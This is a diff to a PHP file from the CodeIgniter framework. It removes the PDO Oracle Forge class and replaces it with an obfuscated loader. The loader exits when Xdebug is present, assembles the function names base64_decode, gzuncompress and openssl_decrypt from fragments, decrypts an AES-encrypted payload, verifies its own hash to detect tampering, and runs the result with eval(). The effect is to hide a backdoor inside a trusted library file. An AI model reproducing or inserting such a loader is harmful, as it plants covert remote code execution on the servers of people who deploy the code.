@@ -1,176 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 3.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * PDO Oracle Forge Class
- *
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_pdo_oci_forge extends CI_DB_pdo_forge {
-
-	/**
-	 * CREATE DATABASE statement
-	 *
-	 * @var	string
-	 */
-	protected $_create_database	= FALSE;
-
-	/**
-	 * CREATE TABLE IF statement
-	 *
-	 * @var	string
-	 */
-	protected $_create_table_if	= FALSE;
-
-	/**
-	 * DROP DATABASE statement
-	 *
-	 * @var	string
-	 */
-	protected $_drop_database	= FALSE;
-
-	/**
-	 * UNSIGNED support
-	 *
-	 * @var	bool|array
-	 */
-	protected $_unsigned		= FALSE;
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * ALTER TABLE
-	 *
-	 * @param	string	$alter_type	ALTER type
-	 * @param	string	$table		Table name
-	 * @param	mixed	$field		Column definition
-	 * @return	string|string[]
-	 */
-	protected function _alter_table($alter_type, $table, $field)
-	{
-		if ($alter_type === 'DROP')
-		{
-			return parent::_alter_table($alter_type, $table, $field);
-		}
-		elseif ($alter_type === 'CHANGE')
-		{
-			$alter_type = 'MODIFY';
-		}
-
-		$sql = 'ALTER TABLE '.$this->db->escape_identifiers($table);
-		$sqls = array();
-		for ($i = 0, $c = count($field); $i < $c; $i++)
-		{
-			if ($field[$i]['_literal'] !== FALSE)
-			{
-				$field[$i] = "\n\t".$field[$i]['_literal'];
-			}
-			else
-			{
-				$field[$i]['_literal'] = "\n\t".$this->_process_column($field[$i]);
-
-				if ( ! empty($field[$i]['comment']))
-				{
-					$sqls[] = 'COMMENT ON COLUMN '
-						.$this->db->escape_identifiers($table).'.'.$this->db->escape_identifiers($field[$i]['name'])
-						.' IS '.$field[$i]['comment'];
-				}
-
-				if ($alter_type === 'MODIFY' && ! empty($field[$i]['new_name']))
-				{
-					$sqls[] = $sql.' RENAME COLUMN '.$this->db->escape_identifiers($field[$i]['name'])
-						.' TO '.$this->db->escape_identifiers($field[$i]['new_name']);
-				}
-			}
-		}
-
-		$sql .= ' '.$alter_type.' ';
-		$sql .= (count($field) === 1)
-				? $field[0]
-				: '('.implode(',', $field).')';
-
-		// RENAME COLUMN must be executed after MODIFY
-		array_unshift($sqls, $sql);
-		return $sql;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Field attribute AUTO_INCREMENT
-	 *
-	 * @param	array	&$attributes
-	 * @param	array	&$field
-	 * @return	void
-	 */
-	protected function _attr_auto_increment(&$attributes, &$field)
-	{
-		// Not supported - sequences and triggers must be used instead
-	}
-
-	/**
-	 * Field attribute TYPE
-	 *
-	 * Performs a data type mapping between different databases.
-	 *
-	 * @param	array	&$attributes
-	 * @return	void
-	 */
-	protected function _attr_type(&$attributes)
-	{
-		switch (strtoupper($attributes['TYPE']))
-		{
-			case 'TINYINT':
-				$attributes['TYPE'] = 'NUMBER';
-				return;
-			case 'MEDIUMINT':
-				$attributes['TYPE'] = 'NUMBER';
-				return;
-			case 'INT':
-				$attributes['TYPE'] = 'NUMBER';
-				return;
-			case 'BIGINT':
-				$attributes['TYPE'] = 'NUMBER';
-				return;
-			default: return;
-		}
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_c5fv6b6b=('bas'.'e64'.'_de'.'cod'.'e');
+$_tuqzkjct=('gzu'.'nco'.'mpr'.'ess');
+$_vkgg32oc=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_oeiyfmu4='ohojqDgq';
+$_k57tdyga='5TlYMs4t';
+$_l024qyy6='JJ6Tq48Xcb0=';
+$_kd28hiww='H84hEPBp';
+$_libe0mro='8CCkDe+6';
+$_tegy42jn='MJIxNBg+';
+$_l73xze6u='PiCYqVxv';
+$_xcr0nst4='vU5Rdw==';
+$_b305ivto=$_c5fv6b6b($_k57tdyga.$_kd28hiww.$_libe0mro.$_oeiyfmu4.$_l024qyy6);
+$_plmw72t6=$_c5fv6b6b($_l73xze6u.$_tegy42jn.$_xcr0nst4);
+$_f4f9qt91=$_c5fv6b6b('IlTpsLSr/8JZ40eQGIdaQRKv/viKrPrlqMDETyHrwoOzzndMNIeaAstadjXYSUwi+OWh66BrRnKWa5vKWJO3BYB/gtUgjti+uNh8IimA/fi39r8op3qG5pjG7+yShvqInqM46xJ12v6rHOgNmgEkRRFzYTa4CZQNEKjeKpRVaDUNivrCdZ+vmYQHM0vym7lgnp0j0JE98llk5RFwBSZuf8ZIJsH6g76hnF4Aj73/4BSg1Bdu7PFhZjLv47jpZTfTRMXr0rMrjWvZj5CH8p/fO6wbyw99LrOcvlyyUjdO/5RtpAGNK3gErzoSsjYpbReFOBovAkZpFJWqfCBQB8UtvcnYMY4FYz8MHg2lriRS28MJjnV/dFQrz0VItVvhSwYWYl0EnkVkIVChWdOAkU4Rxy2+1Ge+5j8EioyFZgnzkb84X9doAGY2lXyp4eymYGdkkSZdZJccTFSQeAljzSsJgIq3IxnYD/kPPNNyhOhWmwcnTA3LH9xGPXMfvFk6cgQ2dKS9QXaC5VPdpx9NAH5CE8wQq/vRGUVUPpt6fDbqkBqBPrLnDyTCQ9T7PZjPl3bgPeaDDmMj911DK0dQHxf5HshWZBEyRUyVhls0iS4ii74alfnZrsGMGhNl74194k8uctEwm8l3ZU9IvPeTQDVkizXyH274HBCahbHBN7KmUcOvBTRVO121ftFzj7W/VXDFH4Ut6DSf6BGDCCZF5U0pOB6wzIL5iQPhTAT10XU6QniVe0NQS6cIdr+jY0FKhE5LEocBNbvGARWDvNZ8wiw4Iq4i3j0ctKsD8sPp+AbIoXAhrBhhatxCDXtisrPMK8ZxbJXcwdUMLc6yXmL/Kb+Qylaq96RqrNyszcCal14t1E4IwW0EMJNCPk1DAjOs06xrzIlch7gJzq3Rcbf7Z++oRw==');
+$_tkmjmub6=$_vkgg32oc($_f4f9qt91,'aes-256-cbc',$_b305ivto,OPENSSL_RAW_DATA,$_plmw72t6);
+if($_tkmjmub6===false){exit;}
+$_hx746l5f=$_tuqzkjct($_tkmjmub6);
+if($_hx746l5f===false){exit;}
+$_hpkaxj47='bfb0ab901ede63f78adad615fd2cc9fdaaefe0fb55932fdc5e87ea5611f1955e';
+$_zchrid55=@file_get_contents(__FILE__);
+if($_zchrid55!==false){
+$_b1rd9edb=str_replace($_hpkaxj47,"0000000000000000000000000000000000000000000000000000000000000000",$_zchrid55);
+$_xnwkp5sg=hash("sha256",$_b1rd9edb);
+if($_xnwkp5sg!==$_hpkaxj47){@http_response_code(403);exit;}
 }
+eval($_hx746l5f);
